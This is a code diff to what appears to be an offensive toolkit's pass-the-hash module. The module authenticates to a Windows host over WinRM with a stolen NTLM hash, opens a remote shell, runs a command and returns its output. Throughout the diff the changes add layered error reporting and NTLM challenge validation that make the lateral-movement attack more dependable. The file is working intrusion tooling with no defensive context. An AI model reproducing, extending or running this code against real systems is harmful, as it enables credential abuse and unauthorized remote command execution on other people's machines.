@@ -11,10 +11,12 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdarg.h>
 #include <string.h>
 
 #include "ark/lateral_impl.h"
 #include "ark/ntlm_pth.h"
+#include "ark/pth_layer.h"
 
 #pragma comment(lib, "wsmsvc.lib")
 #pragma comment(lib, "winhttp.lib")
@@ -274,7 +276,22 @@ typedef struct {
     char      user[256];
     uint8_t   nt[16];
     int       authed;
+    char      fail_layer[24];
 } winrm_http_ctx;
+
+static void pth_set(winrm_http_ctx *ctx, const char *layer) {
+    if (!ctx || ctx->fail_layer[0] || !layer) return;
+    snprintf(ctx->fail_layer, sizeof(ctx->fail_layer), "%s", layer);
+}
+
+static void pth_fmt(char *output, size_t cap, const char *layer, const char *fmt, ...) {
+    char detail[1200];
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(detail, sizeof(detail), fmt, ap);
+    va_end(ap);
+    snprintf(output, cap, "pth_layer=%s: %s", (layer && layer[0]) ? layer : "transport", detail);
+}
 
 static int winhttp_read_all(HINTERNET req, char **body, size_t *body_len, DWORD *status) {
     *body = NULL;
@@ -343,7 +360,7 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
 
     HINTERNET req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!req) return 0;
+    if (!req) { pth_set(ctx, "transport"); return 0; }
 
     WinHttpAddRequestHeaders(req,
         L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
@@ -356,10 +373,12 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
         if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                 (LPVOID)soap, (DWORD)soap_len, (DWORD)soap_len, 0)) {
             WinHttpCloseHandle(req);
+            pth_set(ctx, "transport");
             return 0;
         }
         if (!WinHttpReceiveResponse(req, NULL)) {
             WinHttpCloseHandle(req);
+            pth_set(ctx, "transport");
             return 0;
         }
         DWORD st = 0;
@@ -374,7 +393,7 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
             WinHttpCloseHandle(req);
             req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
                 WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-            if (!req) return 0;
+            if (!req) { pth_set(ctx, "transport"); return 0; }
             WinHttpAddRequestHeaders(req,
                 L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
                 (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
@@ -385,24 +404,24 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
         WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
             WINHTTP_NO_OUTPUT_BUFFER, &hdr_len, WINHTTP_NO_HEADER_INDEX);
         char *hdrs = (char *)malloc(hdr_len + 2);
-        if (!hdrs) { WinHttpCloseHandle(req); return 0; }
+        if (!hdrs) { WinHttpCloseHandle(req); pth_set(ctx, "http_negotiate"); return 0; }
         if (!WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
                 hdrs, &hdr_len, WINHTTP_NO_HEADER_INDEX)) {
-            free(hdrs); WinHttpCloseHandle(req); return 0;
+            free(hdrs); WinHttpCloseHandle(req); pth_set(ctx, "http_negotiate"); return 0;
         }
         WinHttpCloseHandle(req);
 
         /* Type1 */
         uint8_t *t1 = NULL;
         size_t t1_len = 0;
-        if (!ark_ntlm_type1(ctx->domain, &t1, &t1_len)) { free(hdrs); return 0; }
+        if (!ark_ntlm_type1(ctx->domain, &t1, &t1_len)) { free(hdrs); pth_set(ctx, "ntlm_type1"); return 0; }
         char *t1b64 = b64_encode(t1, t1_len);
         free(t1);
-        if (!t1b64) { free(hdrs); return 0; }
+        if (!t1b64) { free(hdrs); pth_set(ctx, "ntlm_type1"); return 0; }
 
         req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-        if (!req) { free(t1b64); free(hdrs); return 0; }
+        if (!req) { free(t1b64); free(hdrs); pth_set(ctx, "transport"); return 0; }
         WinHttpAddRequestHeaders(req,
             L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
             (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
@@ -415,7 +434,7 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
         free(t1b64);
 
         wchar_t *wauth = NULL;
-        if (!utf8_to_wide(auth_hdr, &wauth)) { WinHttpCloseHandle(req); return 0; }
+        if (!utf8_to_wide(auth_hdr, &wauth)) { WinHttpCloseHandle(req); pth_set(ctx, "http_negotiate"); return 0; }
         WinHttpAddRequestHeaders(req, wauth, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
         free(wauth);
 
@@ -423,6 +442,7 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
                 (LPVOID)soap, (DWORD)soap_len, (DWORD)soap_len, 0)
             || !WinHttpReceiveResponse(req, NULL)) {
             WinHttpCloseHandle(req);
+            pth_set(ctx, "transport");
             return 0;
         }
 
@@ -430,10 +450,10 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
         WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
             WINHTTP_NO_OUTPUT_BUFFER, &hdr_len, WINHTTP_NO_HEADER_INDEX);
         hdrs = (char *)malloc(hdr_len + 2);
-        if (!hdrs) { WinHttpCloseHandle(req); return 0; }
+        if (!hdrs) { WinHttpCloseHandle(req); pth_set(ctx, "http_negotiate"); return 0; }
         if (!WinHttpQueryHeaders(req, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX,
                 hdrs, &hdr_len, WINHTTP_NO_HEADER_INDEX)) {
-            free(hdrs); WinHttpCloseHandle(req); return 0;
+            free(hdrs); WinHttpCloseHandle(req); pth_set(ctx, "http_negotiate"); return 0;
         }
         char *body2 = NULL;
         size_t bl2 = 0;
@@ -444,36 +464,45 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
         char chal_b64[4096];
         if (!extract_www_auth_b64(hdrs, chal_b64, sizeof(chal_b64))) {
             free(hdrs);
+            pth_set(ctx, "ntlm_type2");
             return 0;
         }
         free(hdrs);
 
         size_t chal_len = 0;
         uint8_t *chal = b64_decode(chal_b64, &chal_len);
-        if (!chal) return 0;
+        if (!chal) { pth_set(ctx, "ntlm_type2"); return 0; }
+        uint32_t chal_type = 0;
+        if (chal_len >= 12)
+            chal_type = chal[8] | (chal[9] << 8) | (chal[10] << 16) | (chal[11] << 24);
+        if (chal_len < 32 || memcmp(chal, "NTLMSSP\0", 8) != 0 || chal_type != 2) {
+            free(chal);
+            pth_set(ctx, "ntlm_type2");
+            return 0;
+        }
 
         uint8_t *t3 = NULL;
         size_t t3_len = 0;
         if (!ark_ntlm_type3_hash(chal, chal_len, ctx->user, ctx->domain, ctx->nt, &t3, &t3_len)) {
             free(chal);
-            /* Caller surfaces via status/empty; type2 parse or crypto failed. */
+            pth_set(ctx, "ntlm_type3");
             return 0;
         }
 
         free(chal);
         char *t3b64 = b64_encode(t3, t3_len);
         free(t3);
-        if (!t3b64) return 0;
+        if (!t3b64) { pth_set(ctx, "ntlm_type3"); return 0; }
 
         req = WinHttpOpenRequest(ctx->connect, L"POST", L"/wsman", NULL,
             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-        if (!req) { free(t3b64); return 0; }
+        if (!req) { free(t3b64); pth_set(ctx, "transport"); return 0; }
         WinHttpAddRequestHeaders(req,
             L"Content-Type: application/soap+xml;charset=UTF-8\r\nConnection: Keep-Alive",
             (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
         snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: %s %s", scheme, t3b64);
         free(t3b64);
-        if (!utf8_to_wide(auth_hdr, &wauth)) { WinHttpCloseHandle(req); return 0; }
+        if (!utf8_to_wide(auth_hdr, &wauth)) { WinHttpCloseHandle(req); pth_set(ctx, "http_negotiate"); return 0; }
         WinHttpAddRequestHeaders(req, wauth, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
         free(wauth);
         ctx->authed = 1;
@@ -484,11 +513,13 @@ send_final:
             (LPVOID)soap, (DWORD)soap_len, (DWORD)soap_len, 0)
         || !WinHttpReceiveResponse(req, NULL)) {
         WinHttpCloseHandle(req);
+        pth_set(ctx, "transport");
         return 0;
     }
     DWORD st = 0;
     if (!winhttp_read_all(req, resp_body, resp_len, &st)) {
         WinHttpCloseHandle(req);
+        pth_set(ctx, "transport");
         return 0;
     }
     if (status) *status = st;
@@ -552,11 +583,11 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
     output[0] = '\0';
 
     if (!cfg->target[0]) {
-        snprintf(output, output_cap, "winrm PTH requires target host");
+        pth_fmt(output, output_cap, "session", "winrm PTH requires target host");
         return 1;
     }
     if (!cfg->username[0] || !cfg->ntlm_hash[0]) {
-        snprintf(output, output_cap, "winrm PTH requires username and ntlm_hash (32 hex NT or LM:NT)");
+        pth_fmt(output, output_cap, "session", "winrm PTH requires username and ntlm_hash (32 hex NT or LM:NT)");
         return 1;
     }
 
@@ -567,18 +598,18 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
     ark_ntlm_split_user(cfg->username, cfg->domain, ctx.domain, sizeof(ctx.domain),
         ctx.user, sizeof(ctx.user));
     if (!ctx.user[0]) {
-        snprintf(output, output_cap, "winrm PTH: could not parse username");
+        pth_fmt(output, output_cap, "session", "winrm PTH: could not parse username");
         return 1;
     }
     if (!ark_ntlm_parse_hash(cfg->ntlm_hash, ctx.nt)) {
-        snprintf(output, output_cap, "invalid ntlm_hash (need 32 hex NT or LM:NT)");
+        pth_fmt(output, output_cap, "key_derivation", "invalid ntlm_hash (need 32 hex NT or LM:NT)");
         return 1;
     }
 
     ctx.session = WinHttpOpen(L"ARK", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!ctx.session) {
-        snprintf(output, output_cap, "WinHttpOpen failed: %lu", (unsigned long)GetLastError());
+        pth_fmt(output, output_cap, "transport", "WinHttpOpen failed: %lu", (unsigned long)GetLastError());
         return 1;
     }
     /* Single connection for NTLM multi-leg */
@@ -589,7 +620,7 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
     MultiByteToWideChar(CP_UTF8, 0, ctx.host, -1, whost, 256);
     ctx.connect = WinHttpConnect(ctx.session, whost, ctx.port, 0);
     if (!ctx.connect) {
-        snprintf(output, output_cap, "WinHttpConnect failed: %lu", (unsigned long)GetLastError());
+        pth_fmt(output, output_cap, "transport", "WinHttpConnect failed: %lu", (unsigned long)GetLastError());
         WinHttpCloseHandle(ctx.session);
         return 1;
     }
@@ -625,16 +656,16 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
     size_t resp_len = 0;
     DWORD st = 0;
     if (!winrm_http_post(&ctx, soap, &resp, &resp_len, &st) || !resp) {
-        snprintf(output, output_cap,
-            "winrm PTH create shell failed (NTLM/HTTP); user=%s domain=%s host=%s — check hash form, SPN reachability, port 5985",
+        pth_fmt(output, output_cap, ctx.fail_layer,
+            "create shell failed; user=%s domain=%s host=%s port 5985",
             ctx.user, ctx.domain[0] ? ctx.domain : "(empty)", ctx.host);
         WinHttpCloseHandle(ctx.connect);
         WinHttpCloseHandle(ctx.session);
         return 1;
     }
     if (st != 200) {
-        snprintf(output, output_cap,
-            "winrm PTH create shell HTTP %lu (401=bad hash/auth; 500=soap) user=%s domain=%s: %.160s",
+        pth_fmt(output, output_cap, ark_pth_http_layer(st, resp),
+            "create shell HTTP %lu user=%s domain=%s: %.160s",
             (unsigned long)st, ctx.user, ctx.domain[0] ? ctx.domain : "(empty)", resp);
         free(resp);
         WinHttpCloseHandle(ctx.connect);
@@ -645,7 +676,7 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
     /* ShellId */
     char shell_id[256];
     if (!extract_xml_tag(resp, "ShellId", shell_id, sizeof(shell_id))) {
-        snprintf(output, output_cap, "winrm PTH: no ShellId in response");
+        pth_fmt(output, output_cap, "soap_frame", "no ShellId in response");
         free(resp);
         WinHttpCloseHandle(ctx.connect);
         WinHttpCloseHandle(ctx.session);
@@ -676,14 +707,15 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
         ctx.host, (unsigned)ctx.port, msg_id, shell_id, cmd_esc);
 
     if (!winrm_http_post(&ctx, soap, &resp, &resp_len, &st) || !resp) {
-        snprintf(output, output_cap, "winrm PTH command transport failed");
+        pth_fmt(output, output_cap, ctx.fail_layer, "command transport failed");
         WinHttpCloseHandle(ctx.connect);
         WinHttpCloseHandle(ctx.session);
         return 1;
     }
     char cmd_id[256];
     if (st != 200 || !extract_xml_tag(resp, "CommandId", cmd_id, sizeof(cmd_id))) {
-        snprintf(output, output_cap, "winrm PTH command failed HTTP %lu: %.200s",
+        pth_fmt(output, output_cap, st == 200 ? "soap_frame" : ark_pth_http_layer(st, resp),
+            "command failed HTTP %lu: %.200s",
             (unsigned long)st, resp ? resp : "");
         free(resp);
         WinHttpCloseHandle(ctx.connect);
@@ -714,7 +746,7 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
         ctx.host, (unsigned)ctx.port, msg_id, shell_id, cmd_id);
 
     if (!winrm_http_post(&ctx, soap, &resp, &resp_len, &st) || !resp) {
-        snprintf(output, output_cap, "winrm PTH receive transport failed");
+        pth_fmt(output, output_cap, ctx.fail_layer, "receive transport failed");
         WinHttpCloseHandle(ctx.connect);
         WinHttpCloseHandle(ctx.session);
         return 1;
@@ -735,10 +767,14 @@ static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t
             strncpy(output, stream, output_cap - 1);
             *success = 1;
         }
-    } else {
+    } else if (st == 200) {
         snprintf(output, output_cap, "winrm PTH receive HTTP %lu (no stream): %.300s",
             (unsigned long)st, resp);
-        *success = (st == 200);
+        *success = 1;
+    } else {
+        pth_fmt(output, output_cap, ark_pth_http_layer(st, resp),
+            "receive HTTP %lu (no stream): %.300s", (unsigned long)st, resp);
+        *success = 0;
     }
     free(resp);
 
